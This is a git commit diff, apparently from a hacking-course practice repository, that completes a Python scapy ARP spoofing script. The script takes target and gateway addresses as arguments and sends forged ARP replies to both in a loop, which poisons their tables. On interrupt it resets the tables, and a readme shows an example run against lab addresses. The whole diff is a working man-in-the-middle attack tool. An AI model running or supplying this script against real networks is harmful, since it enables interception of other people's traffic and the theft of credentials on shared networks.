144dec6fe81577ad0c6257bffff2af5b1bd56dfd
IEB <iebrosalin@gmail.com>
2020-08-05 11:33:44 -0400

    Completed arp_spoofer min version

--- python_kidy/python2/3 arp_spoofer/arp_spoof.py
+++ python_kidy/python2/3 arp_spoofer/arp_spoof.py
@@ -1,10 +1,21 @@
 #!/usr/bin/env python
 
+import optparse 
 import scapy.all as scapy
+import time
+import sys
+
+def get_arguments():
+    parser = optparse.OptionParser()
+    parser.add_option("-g", "--gateway", dest = "gateway", help = "IP gateway")
+    parser.add_option("-t", "--target", dest = "target", help = "IP target")
+    (options, arguments) = parser.parse_args()
+
+    return options
 
 def get_mac(ip):
-    arp_request = scapy.ART(pdst = ip)
-    broadcast = scapy.Ehther(dst = "ff:ff:ff:ff:ff:ff")
+    arp_request = scapy.ARP(pdst = ip)
+    broadcast = scapy.Ether(dst = "ff:ff:ff:ff:ff:ff")
     arp_request_broadcast = broadcast/arp_request
     answered_list = scapy.srp(arp_request_broadcast, timeout = 1, verbose = False)[0]
 
@@ -13,7 +24,7 @@ def get_mac(ip):
 def spoof(target_ip, spoof_ip):
     target_mac = get_mac(target_ip)
     packet = scapy.ARP(op = 2, pdst = target_ip, hwdst = target_mac, psrc = spoof_ip)
-    scapy.send(packet)
+    scapy.send(packet, verbose = False)
 
 def restore(destination_ip, source_ip):
     destination_mac = get_mac(destination_ip)
@@ -21,16 +32,26 @@ def restore(destination_ip, source_ip):
     packet = scapy.ARP(op = 2, pdst = destination_ip, hwdst = destination_mac, psrc = source_ip, hwsrc = source_mac)
     scapy.send(packet, count = 4, verbose = False)
 
+args = get_arguments()
+
+target = args.target
+gateway = args.gateway
+
+sent_packets_count = 0
+
 try:
     while True:
-        spoof("")
-        spoof("")
+        #spoofing target
+        spoof(target, gateway)
+        #spoofing router
+        spoof(gateway, target)
         sent_packets_count += 2
         print("\r[+] Packets sent: " + str(sent_packets_count)),
+        # time.sleep(1)
         # Python 3
         #print("\r[+] Packets sent: " + str(sent_packets_count), end = "")
 except KeyboardInterrupt:
-    print("[+] Detected CTRL + C ......... Resetting ARP tables..... Please wait......")
-    restore()
-    restore()
+    print("\n[+] Detected CTRL + C ......... Resetting ARP tables..... Please wait......")
+    restore(target, gateway)
+    restore(gateway, target)
     
---
+++ python_kidy/python2/3 arp_spoofer/readme.md
@@ -0,0 +1,7 @@
+##Examples
+
+```
+    #check router ip
+    route -n
+    python arp_spoof.py -t 10.0.2.15 -g 10.0.2.1
+```
